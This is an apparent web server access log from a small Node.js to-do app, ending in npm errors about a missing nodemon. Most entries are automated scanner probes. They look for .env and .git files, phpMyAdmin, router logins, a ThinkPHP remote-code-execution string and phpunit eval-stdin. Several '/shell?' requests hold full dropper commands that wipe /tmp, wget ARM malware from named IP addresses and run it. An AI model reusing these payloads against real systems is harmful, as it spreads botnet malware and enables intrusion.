(node:8306) DeprecationWarning: current Server Discovery and Monitoring engine is deprecated, and will be removed in a future version. To use the new Server Discover and Monitoring engine, pass option { useUnifiedTopology: true } to the MongoClient constructor.
GET / 200 1005 - 56.514 ms
GET /stylesheets/style.css 200 89 - 6.924 ms
GET /css/fontawesome-all.css 200 51609 - 2.176 ms
GET /js/jquery.min.js 200 89476 - 4.895 ms
GET /js/bootstrap.min.js 200 60044 - 2.045 ms
GET /css/bootstrap.min.css 200 160302 - 2.593 ms
GET / 304 - - 7.984 ms
GET /stylesheets/style.css 304 - - 0.883 ms
GET /css/bootstrap.min.css 304 - - 0.584 ms
GET /css/fontawesome-all.css 304 - - 2.212 ms
GET /js/bootstrap.min.js 304 - - 0.696 ms
GET /js/jquery.min.js 304 - - 1.716 ms
GET /task/add 200 1933 - 2.253 ms
GET /stylesheets/style.css 304 - - 1.300 ms
GET /css/bootstrap.min.css 304 - - 2.812 ms
GET /js/jquery.min.js 304 - - 2.990 ms
GET /js/bootstrap.min.js 304 - - 0.485 ms
POST /task/add/ 302 46 - 47.812 ms
GET / 200 2856 - 8.618 ms
GET /stylesheets/style.css 304 - - 0.529 ms
GET /css/bootstrap.min.css 304 - - 0.517 ms
GET /css/fontawesome-all.css 304 - - 0.690 ms
GET /js/jquery.min.js 304 - - 0.594 ms
GET /js/bootstrap.min.js 304 - - 0.481 ms
GET /webfonts/fa-solid-900.woff2 200 50372 - 3.160 ms
POST /task/complete/5f4ec7616a87232072e54595 302 46 - 9.503 ms
GET / 200 2635 - 8.015 ms
GET /stylesheets/style.css 304 - - 0.487 ms
GET /css/bootstrap.min.css 304 - - 0.546 ms
GET /css/fontawesome-all.css 304 - - 0.562 ms
GET /js/jquery.min.js 304 - - 0.561 ms
GET /js/bootstrap.min.js 304 - - 0.482 ms
GET / 304 - - 7.921 ms
GET /stylesheets/style.css 304 - - 0.482 ms
GET /css/bootstrap.min.css 304 - - 0.638 ms
GET /js/jquery.min.js 304 - - 0.725 ms
GET /css/fontawesome-all.css 304 - - 0.574 ms
GET /js/bootstrap.min.js 304 - - 0.464 ms
GET /webfonts/fa-solid-900.woff2 304 - - 0.657 ms
GET / 304 - - 7.890 ms
GET /stylesheets/style.css 304 - - 0.472 ms
GET /css/bootstrap.min.css 304 - - 0.502 ms
GET /css/fontawesome-all.css 304 - - 0.691 ms
GET /js/jquery.min.js 304 - - 0.594 ms
GET /js/bootstrap.min.js 304 - - 0.464 ms
GET /webfonts/fa-solid-900.woff2 304 - - 0.626 ms
GET / 304 - - 6.601 ms
GET /stylesheets/style.css 304 - - 1.552 ms
GET /css/fontawesome-all.css 304 - - 0.676 ms
GET /js/bootstrap.min.js 304 - - 0.901 ms
GET /js/jquery.min.js 304 - - 1.069 ms
GET /css/bootstrap.min.css 304 - - 0.628 ms
GET /webfonts/fa-solid-900.woff2 304 - - 0.629 ms
GET / 304 - - 6.627 ms
GET /stylesheets/style.css 304 - - 0.483 ms
GET /css/bootstrap.min.css 304 - - 0.474 ms
GET /js/jquery.min.js 304 - - 1.631 ms
GET /css/fontawesome-all.css 304 - - 0.535 ms
GET /js/bootstrap.min.js 304 - - 0.485 ms
GET /webfonts/fa-solid-900.woff2 304 - - 0.622 ms
GET / 304 - - 6.349 ms
GET /stylesheets/style.css 304 - - 0.459 ms
GET /css/bootstrap.min.css 304 - - 0.464 ms
GET /css/fontawesome-all.css 304 - - 0.649 ms
GET /js/bootstrap.min.js 304 - - 0.645 ms
GET /js/jquery.min.js 304 - - 0.567 ms
GET /webfonts/fa-solid-900.woff2 304 - - 0.506 ms
GET / 200 2635 - 6.641 ms
GET /stylesheets/style.css 200 89 - 0.727 ms
GET /css/fontawesome-all.css 200 51609 - 0.856 ms
GET /js/bootstrap.min.js 200 60044 - 2.160 ms
GET /css/bootstrap.min.css 200 160302 - 0.673 ms
GET /js/jquery.min.js 200 89476 - 2.875 ms
GET /webfonts/fa-solid-900.woff2 200 50372 - 3.307 ms
GET /task/add 200 1933 - 1.290 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.444 ms
GET /css/bootstrap.min.css 304 - - 1.367 ms
GET /js/bootstrap.min.js 304 - - 1.167 ms
GET /js/jquery.min.js 304 - - 1.911 ms
POST /task/add/ 302 46 - 6.260 ms
GET / 200 4525 - 7.540 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.465 ms
GET /css/bootstrap.min.css 304 - - 0.748 ms
GET /css/fontawesome-all.css 304 - - 1.702 ms
GET /js/bootstrap.min.js 304 - - 0.928 ms
GET /js/jquery.min.js 304 - - 1.086 ms
GET /webfonts/fa-solid-900.woff2 304 - - 0.640 ms
GET /task/edit/5f4ec9886a87232072e54596 200 2079 - 14.634 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.436 ms
GET /css/bootstrap.min.css 304 - - 0.917 ms
GET /js/jquery.min.js 304 - - 1.075 ms
GET /js/bootstrap.min.js 304 - - 0.430 ms
POST /task/edit/5f4ec9886a87232072e54596 - - - - ms
GET /favicon.ico - - - - ms
GET /.env 404 840 - 8.555 ms
POST / 404 904 - 1.263 ms
GET / 200 4525 - 5.868 ms
GET /phpmyadmin/ 404 847 - 1.011 ms
GET / 200 4525 - 6.451 ms
GET / 200 4525 - 5.369 ms
GET /portal/redlion 404 847 - 1.055 ms
GET /config/getuser?index=0 404 847 - 0.970 ms
GET / 200 4525 - 5.614 ms
POST /xmlrpc.php 404 904 - 1.075 ms
POST /wordpress/xmlrpc.php 404 904 - 1.078 ms
POST /blog/xmlrpc.php 404 904 - 1.025 ms
GET /phpMyAdmin/index.php 404 847 - 0.970 ms
GET /pma/index.php 404 847 - 0.953 ms
GET /phpmyadmin/index.php 404 847 - 0.934 ms
GET /phpmyadmin/ 404 847 - 0.995 ms
POST /boaform/admin/formLogin 404 904 - 0.999 ms
GET / 200 4525 - 15.799 ms
GET / 200 4525 - 5.581 ms
GET / 200 4525 - 6.250 ms
GET / 200 4525 - 5.148 ms
GET / 200 4525 - 6.113 ms
GET /hudson 404 847 - 0.974 ms
GET / 200 4525 - 5.413 ms
GET / 200 4525 - 8.028 ms
GET /solr/admin/info/system?wt=json 404 847 - 0.983 ms
GET / 200 4525 - 5.204 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 4525 - 5.158 ms
GET / 200 4525 - 5.414 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 4525 - 5.344 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 847 - 0.941 ms
GET / 200 4525 - 5.412 ms
GET / 200 4525 - 5.135 ms
GET / 200 4525 - 6.038 ms
GET / 200 4525 - 5.257 ms
GET / 200 4525 - 7.837 ms
GET / 200 4525 - 12.381 ms
GET / 200 4525 - 15.218 ms
GET / 200 4525 - 18.898 ms
GET / 200 4525 - 20.561 ms
POST /api/jsonws/invoke 404 904 - 1.146 ms
GET / 200 4525 - 5.257 ms
GET / 200 4525 - 11.141 ms
GET / 200 4525 - 5.103 ms
GET /solr/admin/info/system?wt=json 404 847 - 0.909 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 4525 - 6.180 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 4525 - 5.065 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 847 - 0.892 ms
POST /boaform/admin/formLogin 404 904 - 0.977 ms
GET / 200 4525 - 5.138 ms
GET / 200 4525 - 5.283 ms
GET / 200 4525 - 6.175 ms
POST /api/jsonws/invoke 404 904 - 0.920 ms
GET /manager/html 404 847 - 0.937 ms
GET /shell?uname%20-a 404 847 - 0.933 ms
GET / 200 4525 - 5.974 ms
GET / 200 4525 - 5.193 ms
GET / 200 4525 - 8.613 ms
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 847 - 1.045 ms
GET / 200 4525 - 5.125 ms
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 904 - 0.984 ms
GET / 200 4525 - 6.351 ms
GET /muieblackcat 404 847 - 0.939 ms
GET //phpMyAdmin-3.0.0.0-all-languages/scripts/setup.php 404 847 - 0.930 ms
GET //phpMyAdmin-2.10.0.0/scripts/setup.php 404 847 - 0.903 ms
GET //phpMyAdmin-2.11.11/scripts/setup.php 404 847 - 1.623 ms
GET //phpMyAdmin-2.11.11.3/scripts/setup.php 404 847 - 0.955 ms
GET //phpMyAdmin-2.11.11.3/scripts/setup.ph 404 847 - 0.952 ms
GET //phpMyAdmin-2.11.11.3-all-languages/scripts/setup.php 404 847 - 0.936 ms
GET //phpMyAdmin-2/scripts/setup.php 404 847 - 0.970 ms
GET //my/scripts/setup.php 404 847 - 0.979 ms
GET //MyAdmin/scripts/setup.php 404 847 - 0.923 ms
GET //PHPMYADMIN/scripts/setup.php 404 847 - 0.922 ms
GET //db/scripts/setup.php 404 847 - 0.919 ms
GET //dbadmin/scripts/setup.php 404 847 - 0.946 ms
GET //myadmin/scripts/setup.php 404 847 - 0.993 ms
GET //myadmin/scripts/db___.init.php 404 847 - 0.915 ms
GET //MyAdmin/scripts/db___.init.php 404 847 - 1.754 ms
GET //mysql/scripts/setup.php 404 847 - 0.921 ms
GET //mysqladmin/scripts/setup.php 404 847 - 0.937 ms
GET //pHpMyAdMiN/scripts/setup.php 404 847 - 0.939 ms
GET //phpMyAdmin/scripts/setup.php 404 847 - 0.902 ms
GET //phpadmin/scripts/setup.php 404 847 - 0.922 ms
GET //phpmyadmin/scripts/setup.php 404 847 - 0.910 ms
GET //phpmyadmin/scripts/db___.init.php 404 847 - 0.961 ms
GET //phpMyAdmin/scripts/db___.init.php 404 847 - 0.943 ms
GET //pma/scripts/db___.init.php 404 847 - 0.912 ms
GET //PMA/scripts/db___.init.php 404 847 - 0.932 ms
GET //sqladm/scripts/setup.php 404 847 - 1.885 ms
GET //sqladmin/scripts/setup.php 404 847 - 0.921 ms
GET //sqlite/main.php 404 847 - 0.914 ms
GET //SQLiteManager/main.php 404 847 - 0.955 ms
GET //sqlitemanager/main.php 404 847 - 1.053 ms
GET //phpmyadmin/scripts/db.init.php 404 847 - 0.907 ms
GET //phpMyAdmin/scripts/db.init.php 404 847 - 0.992 ms
GET //MyAdmin/scripts/setup.php 404 847 - 0.966 ms
GET //database/scripts/setup.php 404 847 - 0.935 ms
GET //phpAdmin/scripts/setup.php 404 847 - 0.937 ms
GET //phpmyadmin1/scripts/setup.php 404 847 - 0.931 ms
GET //phpmyadmin2/scripts/setup.php 404 847 - 1.819 ms
GET //pma/scripts/setup.php 404 847 - 0.922 ms
GET //scripts/setup.php 404 847 - 0.943 ms
GET //scripts/db___.init.php 404 847 - 0.948 ms
GET //setup.php 404 847 - 0.911 ms
GET /portal/redlion 404 847 - 0.927 ms
GET /.git/HEAD 404 847 - 0.985 ms
PROPFIND / 404 904 - 0.542 ms
GET /nmaplowercheck1599105818 404 847 - 3.184 ms
GET / 200 4525 - 16.951 ms
GET / 200 4525 - 20.636 ms
OPTIONS / 404 904 - 0.737 ms
GET / 200 4525 - 5.896 ms
OPTIONS / 404 904 - 0.584 ms
POST / 404 904 - 1.060 ms
GET /robots.txt 404 847 - 0.717 ms
PROPFIND / 404 904 - 0.540 ms
OPTIONS / 404 904 - 0.559 ms
GET /HNAP1 404 847 - 0.964 ms
OPTIONS / 404 904 - 0.553 ms
GET / 200 4525 - 15.505 ms
GET / 200 4525 - 5.811 ms
GET / 200 4525 - 5.120 ms
GET / 200 4525 - 5.931 ms
GET /.env 404 840 - 0.832 ms
GET / 200 4525 - 5.219 ms
GET / 200 4525 - 5.140 ms
GET /solr/admin/info/system?wt=json 404 847 - 0.901 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 4525 - 5.110 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 4525 - 6.070 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 847 - 0.889 ms
GET / 200 4525 - 7.584 ms
POST /api/jsonws/invoke 404 904 - 1.063 ms
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 847 - 1.061 ms
GET / 200 4525 - 5.172 ms
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 904 - 0.991 ms
GET /hudson 404 847 - 0.910 ms
GET / 200 4525 - 5.878 ms
GET / 200 4525 - 5.192 ms
GET / 200 4525 - 5.205 ms
GET / 200 4525 - 5.313 ms
GET / 200 4525 - 5.906 ms
GET / 200 4525 - 5.247 ms
GET / 200 4525 - 5.938 ms
GET / 200 4525 - 5.068 ms
GET / 200 4525 - 5.843 ms
GET / 200 4525 - 5.040 ms
GET / 200 4525 - 5.134 ms
GET / 200 4525 - 5.788 ms
GET / 200 4525 - 5.210 ms
GET / 200 4525 - 5.137 ms
GET /.git/config 404 847 - 1.658 ms
GET / 200 4525 - 6.377 ms
GET /.env 404 840 - 0.779 ms
GET /v2/_catalog 404 847 - 2.059 ms
GET / 200 4525 - 5.186 ms
GET http://example.com/ 200 4525 - 5.255 ms
GET / 200 4525 - 5.930 ms
GET / 200 4525 - 5.191 ms
GET / 200 4525 - 7.638 ms
GET /portal/redlion 404 847 - 0.939 ms
GET /solr/admin/info/system?wt=json 404 847 - 0.960 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 4525 - 11.060 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 4525 - 5.181 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 847 - 1.721 ms
GET / 200 4525 - 5.879 ms
POST /api/jsonws/invoke 404 904 - 0.865 ms
POST /boaform/admin/formLogin 404 904 - 1.004 ms
GET / 200 4525 - 5.222 ms
GET /manager/text/list 404 847 - 0.958 ms
GET / 200 4525 - 5.381 ms
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 847 - 0.996 ms
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 904 - 0.938 ms
HEAD /robots.txt 404 847 - 0.924 ms
GET / 200 4525 - 8.373 ms
GET / 200 4525 - 5.254 ms
GET / 200 4525 - 5.263 ms
GET / 200 4525 - 9.033 ms
GET / 200 4525 - 6.094 ms
GET / 200 4525 - 5.161 ms
GET / 200 4525 - 10.699 ms
GET / 200 4525 - 7.622 ms
GET / 200 4525 - 5.094 ms
GET /currentsetting.htm 404 847 - 0.982 ms
GET /scgi-bin/platform.cgi 404 847 - 0.914 ms
GET /cgi-bin/p2p.cgi?cmd=p2p.cgi&-action=get 404 847 - 0.934 ms
GET /cgi-bin/welcome.cgi 404 847 - 0.948 ms
GET /cgi-bin/webproc 404 847 - 1.770 ms
GET /webaccess/index.php 404 847 - 0.941 ms
GET /HNAP1/ 404 847 - 0.903 ms
GET /common/info.cgi 404 847 - 0.999 ms
GET /hnap/hnap_service 404 847 - 0.939 ms
GET /stssys.htm 404 847 - 2.610 ms
GET /index.asp 404 847 - 1.069 ms
GET /login.htm 404 847 - 0.946 ms
GET /webpages/login.html 404 847 - 0.956 ms
GET /FHFactoryCheck.html 404 847 - 0.932 ms
GET /login 404 847 - 0.928 ms
GET /cgi-bin/dispatcher.cgi?cmd=0 404 847 - 3.764 ms
GET /cgi-bin/login.asp 404 847 - 0.945 ms
GET /rpAuth.html 404 847 - 0.925 ms
GET /login.asp 404 847 - 0.928 ms
GET /login/login.html 404 847 - 0.914 ms
GET /login.html 404 847 - 0.940 ms
GET /usrlogin.asp 404 847 - 1.064 ms
GET /html/login.html 404 847 - 0.931 ms
GET /index_style.css 404 847 - 1.014 ms
GET /weblogin.htm 404 847 - 5.017 ms
GET /login.asp 404 847 - 1.773 ms
GET /admin/login.jsp 404 847 - 0.914 ms
GET /auth/login/ 404 847 - 0.956 ms
GET /client/login 404 847 - 0.918 ms
GET /upnp.jsp 404 847 - 0.932 ms
GET /cgi-bin/luci/web 404 847 - 0.910 ms
GET /login.asp 404 847 - 0.918 ms
GET /index.html 404 847 - 0.922 ms
GET /login.html 404 847 - 0.912 ms
GET /index.htm 404 847 - 0.931 ms
GET /images/favicon.ico 404 847 - 1.774 ms
GET /index.en-us.uil 404 847 - 0.915 ms
GET /request_para.cgi?parameter=netstate 404 847 - 0.967 ms
GET /login.html 404 847 - 0.913 ms
GET /home/login.html 404 847 - 0.921 ms
GET /chinese.js 404 847 - 0.923 ms
GET /img/R1/favicon.ico 404 847 - 0.913 ms
GET /favicon.ico - - - - ms
GET /static/js/first.txt - - - - ms
GET /magis/ 404 847 - 0.932 ms
GET /home.asp 404 847 - 0.947 ms
GET /login.html 404 847 - 0.885 ms
GET /cgi-bin/welcome.cgi 404 847 - 0.954 ms
GET /cgi-bin/luci 404 847 - 0.914 ms
GET /cgi-bin/welcome.cgi 404 847 - 0.937 ms
GET /cgi-bin/luci 404 847 - 0.901 ms
GET / 200 4525 - 5.138 ms
GET /cgi-bin/welcome.cgi 404 847 - 0.948 ms
GET /cgi-bin/user/Config.cgi?.cab&action=get&category=Account.* 404 847 - 1.883 ms
GET /cgi-bin/nobody/Machine.cgi?action=get_capability 404 847 - 0.913 ms
GET /current_config/passwd 404 847 - 0.961 ms
GET /system.ini?loginuse&loginpas 404 847 - 0.905 ms
GET / 200 4525 - 5.131 ms
GET /cgi-bin/luci 404 847 - 0.907 ms
GET / 200 4525 - 16.984 ms
GET / 200 4525 - 5.721 ms
GET / 200 4525 - 5.293 ms
GET / 200 4525 - 5.850 ms
GET / 200 4525 - 4.981 ms
GET / 200 4525 - 6.028 ms
GET / 200 4525 - 5.026 ms
GET / 200 4525 - 4.988 ms
GET / 200 4525 - 6.170 ms
GET / 200 4525 - 5.126 ms
POST /boaform/admin/formPing 404 904 - 0.727 ms
GET / 200 4525 - 5.828 ms
GET / 200 4525 - 5.055 ms
GET / 200 4525 - 6.014 ms
GET / 200 4525 - 5.115 ms
GET / 200 4525 - 5.839 ms
GET / 200 4525 - 5.098 ms
GET / 200 4525 - 4.909 ms
POST /boaform/admin/formLogin 404 904 - 0.948 ms
GET /spa112.cfg 404 847 - 0.959 ms
HEAD /robots.txt 404 847 - 0.906 ms
GET / 200 4525 - 5.242 ms
GET / 200 4525 - 5.873 ms
GET / 200 4525 - 5.120 ms
GET / 200 4525 - 5.139 ms
GET / 200 4525 - 5.206 ms
GET /.env 404 840 - 0.871 ms
POST / 404 904 - 0.979 ms
GET / 200 4525 - 8.645 ms
GET / 200 4525 - 5.003 ms
POST /boaform/admin/formLogin 404 904 - 0.960 ms
GET /phpmyadmin/ 404 847 - 0.928 ms
GET / 200 4525 - 5.170 ms
GET / 200 4525 - 5.005 ms
GET /hudson 404 847 - 0.995 ms
GET /solr/admin/info/system?wt=json 404 847 - 0.899 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 4525 - 5.010 ms
GET / 200 4525 - 5.084 ms
GET / 200 4525 - 4.326 ms
GET / 200 4525 - 5.598 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 4525 - 5.105 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 847 - 0.928 ms
GET / 200 4525 - 5.130 ms
GET / 200 4525 - 5.626 ms
GET /.env 404 840 - 0.851 ms
POST / 404 904 - 0.947 ms
GET / 200 4525 - 5.121 ms
GET / 200 4525 - 5.066 ms
POST /boaform/admin/formLogin 404 904 - 5.020 ms
POST /api/jsonws/invoke 404 904 - 0.845 ms
GET / 200 4525 - 5.945 ms
GET / 200 4525 - 6.763 ms
GET / 200 4525 - 6.155 ms
GET / 200 4525 - 5.593 ms
GET /.env 404 840 - 0.673 ms
GET /.remote 404 840 - 0.574 ms
GET /.local 404 840 - 0.626 ms
GET /.production 404 840 - 0.570 ms
GET //vendor/.env 404 840 - 0.580 ms
GET //lib/.env 404 840 - 0.623 ms
GET //lab/.env 404 840 - 0.600 ms
GET //cronlab/.env 404 840 - 0.679 ms
GET //cron/.env 404 840 - 1.455 ms
GET //core/.env 404 840 - 0.596 ms
GET //core/app/.env 404 840 - 0.590 ms
GET //core/Datavase/.env 404 840 - 0.586 ms
GET //database/.env 404 840 - 0.582 ms
GET //config/.env 404 840 - 0.590 ms
GET //assets/.env 404 840 - 0.581 ms
GET //app/.env 404 840 - 0.581 ms
GET //apps/.env 404 840 - 0.580 ms
GET //uploads/.env 404 840 - 0.581 ms
GET //sitemaps/.env 404 840 - 0.585 ms
GET //saas/.env 404 840 - 0.575 ms
GET / 200 4525 - 7.991 ms
GET /phpmyadmin/ 404 847 - 0.948 ms
GET /TP/public/index.php 404 847 - 0.986 ms
GET /TP/index.php 404 847 - 0.927 ms
GET /thinkphp/html/public/index.php 404 847 - 0.912 ms
GET /html/public/index.php 404 847 - 0.933 ms
GET /public/index.php 404 847 - 0.947 ms
GET /TP/html/public/index.php 404 847 - 4.208 ms
GET /elrekt.php 404 847 - 0.896 ms
GET /index.php 404 847 - 0.890 ms
GET / 200 4525 - 7.814 ms
GET /portal/redlion 404 847 - 1.173 ms
GET /.env 404 840 - 0.807 ms
POST / 404 904 - 1.646 ms
GET / 200 4525 - 5.298 ms
GET / 200 4525 - 6.029 ms
GET / 200 4525 - 5.044 ms
GET / 200 4525 - 5.871 ms
GET / 200 4525 - 5.833 ms
POST /boaform/admin/formLogin 404 904 - 0.932 ms
GET /solr/admin/info/system?wt=json 404 847 - 0.921 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 4525 - 5.177 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 4525 - 5.021 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 847 - 0.934 ms
GET / 200 4525 - 5.029 ms
POST /boaform/admin/formLogin 404 904 - 0.970 ms
GET / 200 4525 - 9.385 ms
GET / 200 4525 - 5.837 ms
GET / 200 4525 - 4.964 ms
GET / 200 4525 - 5.099 ms
GET / 200 4525 - 5.739 ms
GET / 200 4525 - 5.850 ms
GET / 200 4525 - 5.018 ms
GET / 200 4525 - 4.992 ms
GET /robots.txt 404 847 - 0.946 ms
GET /sitemap.xml 404 847 - 0.941 ms
GET /.well-known/security.txt 404 847 - 0.991 ms
GET /favicon.ico - - - - ms
GET /hudson 404 847 - 0.937 ms
POST /boaform/admin/formLogin 404 904 - 0.946 ms
GET / 200 4525 - 5.138 ms
GET /solr/admin/info/system?wt=json 404 847 - 0.902 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 4525 - 4.982 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 4525 - 6.415 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 847 - 0.926 ms
GET / 200 4525 - 14.606 ms
GET / 200 4525 - 5.033 ms
GET / 200 4525 - 5.528 ms
GET / 200 4525 - 5.085 ms
POST /api/jsonws/invoke 404 904 - 0.902 ms
GET / 200 4525 - 5.152 ms
GET / 200 4525 - 5.015 ms
GET /manager/html 404 847 - 0.940 ms
GET / 200 4525 - 5.071 ms
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 847 - 0.991 ms
GET / 200 4525 - 5.973 ms
GET /level/15/exec/-/sh/run/CR 404 847 - 1.947 ms
GET / 200 4525 - 7.339 ms
HEAD /robots.txt 404 847 - 1.091 ms
GET /portal/redlion 404 847 - 0.941 ms
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 904 - 1.154 ms
GET / 200 4525 - 5.724 ms
POST /boaform/admin/formLogin 404 904 - 0.953 ms
GET / 200 4525 - 5.242 ms
GET /spa122.cfg 404 847 - 1.029 ms
GET / 200 4525 - 5.385 ms
GET /solr/admin/info/system?wt=json 404 847 - 0.972 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 4525 - 5.210 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 4525 - 5.846 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 847 - 0.996 ms
GET / 200 4525 - 6.070 ms
GET / 200 4525 - 5.814 ms
GET / 200 4525 - 5.186 ms
GET /TP/public/index.php 404 847 - 3.986 ms
GET /TP/index.php 404 847 - 0.962 ms
GET /thinkphp/html/public/index.php 404 847 - 0.970 ms
GET /html/public/index.php 404 847 - 1.606 ms
GET /public/index.php 404 847 - 0.928 ms
GET /TP/html/public/index.php 404 847 - 0.929 ms
GET /elrekt.php 404 847 - 0.932 ms
GET /index.php 404 847 - 0.968 ms
GET / 200 4525 - 11.018 ms
GET / 200 4525 - 6.941 ms
GET / 200 4525 - 6.439 ms
POST /boaform/admin/formLogin 404 904 - 0.962 ms
GET / 200 4525 - 5.924 ms
GET / 200 4525 - 5.130 ms
GET /hudson 404 847 - 0.962 ms
POST /api/jsonws/invoke 404 904 - 0.912 ms
GET / 200 4525 - 5.075 ms
GET / 200 4525 - 11.296 ms
GET / 200 4525 - 5.014 ms
GET /solr/admin/info/system?wt=json 404 847 - 0.966 ms
GET / 200 4525 - 5.131 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 4525 - 5.173 ms
GET / 200 4525 - 15.616 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 4525 - 6.026 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 847 - 0.907 ms
GET / 200 4525 - 9.544 ms
GET /shell?cd+/tmp;rm+-rf+*;wget+185.132.53.147/hakaibin/h4k4i.arm7;chmod+777+/tmp/h4k4i.arm7;sh+/tmp/h4k4i.arm7+hakai.Rep.Jaws 404 847 - 0.971 ms
POST /api/jsonws/invoke 404 904 - 0.901 ms
GET / 200 4525 - 5.832 ms
GET / 200 4525 - 4.887 ms
GET / 200 4525 - 4.979 ms
GET / 200 4525 - 5.961 ms
GET / 200 4525 - 4.798 ms
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 847 - 0.970 ms
GET /shell?cd+/tmp;rm+-rf+*;wget+150.95.31.71/beastmode/b3astmode.arm7;chmod+777+/tmp/b3astmode.arm7;sh+/tmp/b3astmode.arm7+BeastMode.Rep.Jaws - - - - ms
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 904 - 0.944 ms
GET / 200 4525 - 5.088 ms
GET /shell?cd+/tmp;rm+-rf+*;wget+185.132.53.147/hakaibin/h4k4i.arm7;chmod+777+/tmp/h4k4i.arm7;sh+/tmp/h4k4i.arm7+hakai.Rep.Jaws 404 847 - 0.950 ms
POST /boaform/admin/formLogin 404 904 - 0.968 ms
GET / 200 4525 - 5.831 ms
GET / 200 4525 - 5.012 ms
GET /shell?cd+/tmp;rm+-rf+*;wget+185.132.53.147/hakaibin/h4k4i.arm7;chmod+777+/tmp/h4k4i.arm7;sh+/tmp/h4k4i.arm7+hakai.Rep.Jaws - - - - ms
GET /shell?cd+/tmp;rm+-rf+*;wget+167.172.242.42/beastmode/b3astmode.arm7;chmod+777+/tmp/b3astmode.arm7;sh+/tmp/b3astmode.arm7+BeastMode.Rep.Jaws 404 847 - 0.993 ms
GET / 200 4525 - 5.287 ms
GET /.env 404 840 - 0.822 ms
POST / 404 904 - 3.244 ms
HEAD /robots.txt 404 847 - 0.914 ms
GET / 200 4525 - 10.618 ms
GET / 200 4525 - 5.438 ms
GET /portal/redlion 404 847 - 1.649 ms
GET /Telerik.Web.UI.WebResource.axd?type=rau 404 847 - 0.912 ms
POST /boaform/admin/formLogin 404 904 - 0.936 ms
GET / 200 4525 - 4.954 ms
GET / 200 4525 - 5.262 ms
GET /stylesheets/style.css 200 89 - 2.728 ms
GET /css/bootstrap.min.css 200 160302 - 0.795 ms
GET /css/fontawesome-all.css 200 51609 - 1.171 ms
GET /js/jquery.min.js 200 89476 - 0.896 ms
GET /js/bootstrap.min.js 200 60044 - 1.203 ms
GET /webfonts/fa-solid-900.woff2 200 50372 - 0.755 ms
GET / 304 - - 9.949 ms
GET /stylesheets/style.css 304 - - 0.855 ms
GET /css/bootstrap.min.css 304 - - 0.452 ms
GET /css/fontawesome-all.css 304 - - 1.141 ms
GET /js/jquery.min.js 304 - - 1.117 ms
GET /js/bootstrap.min.js 304 - - 0.418 ms
GET /webfonts/fa-solid-900.woff2 304 - - 0.610 ms
GET / 304 - - 5.218 ms
GET /stylesheets/style.css 304 - - 0.498 ms
GET /css/bootstrap.min.css 304 - - 0.576 ms
GET /js/jquery.min.js 304 - - 0.854 ms
GET /css/fontawesome-all.css 304 - - 4.787 ms
GET /js/bootstrap.min.js 304 - - 0.422 ms
GET /webfonts/fa-solid-900.woff2 304 - - 0.587 ms

> todo@0.0.0 start /home/bitnami/todo
> DEBUG=app:* nodemon ./bin/www

sh: 1: nodemon: not found
npm ERR! code ELIFECYCLE
npm ERR! syscall spawn
npm ERR! file sh
npm ERR! errno ENOENT
npm ERR! todo@0.0.0 start: `DEBUG=app:* nodemon ./bin/www`
npm ERR! spawn ENOENT
npm ERR! 
npm ERR! Failed at the todo@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2020-09-21T17_17_06_148Z-debug.log

> todo@0.0.0 start /home/bitnami/todo
> DEBUG=app:* nodemon ./bin/www

sh: 1: nodemon: not found
npm ERR! code ELIFECYCLE
npm ERR! syscall spawn
